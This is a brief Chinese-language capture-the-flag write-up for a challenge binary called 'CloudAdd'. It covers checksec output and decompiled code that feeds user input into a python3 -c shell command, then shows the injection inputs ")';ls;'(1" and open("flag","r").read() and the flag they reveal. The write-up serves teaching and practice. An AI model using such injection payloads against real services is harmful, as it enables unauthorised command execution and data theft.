@@ -1,1 +1,58 @@
+检查elf文件开启的保护
+
+checksec chal    
+[*] '/home/.../chal'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+
+
+
+保护全部开启，放到ida64位反编译
+
+sub_10B0("Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!\n*this is not a legally binding statement");
+sub_10E0("Variable one: ");
+sub_1100("%55s", v7);
+sub_10E0("Variable two: ");
+sub_1100("%55s", v8);
+sub_1110(output_buff, "python3 -c 'print(%s + %s)'", v7, v8);
+sub_10D0(output_buff);
+result = 0;
+v6 = __readfsqword(0x28u);
+v5 = v6 ^ v10;
+if ( v6 != v10 )
+	result = sub_10C0(output_buff, "python3 -c 'print(%s + %s)'", v5);
+return result;
+
+
+
+主要存在漏洞为：python3 -c 'print(%s + %s)，可以直接调用shell命令
+command: python -c 'print()';ls;'(1 + 2)');
+
+
+Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
+*this is not a legally binding statement
+Variable one: )';ls;'(1
+Variable two: 2
+
+chal  chal.id0	chal.id1  chal.id2  chal.nam  chal.til	exp.py	flag
+sh: 1: (1 + 2): not found
+
+
+
+存在flag文件，使用python读取文件内容：open("flag","r").read()
+
+Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
+*this is not a legally binding statement
+Variable one: ""    
+Variable two: open("flag","r").read()
+flag{this-is-flag}
+
+
+
+
+
 
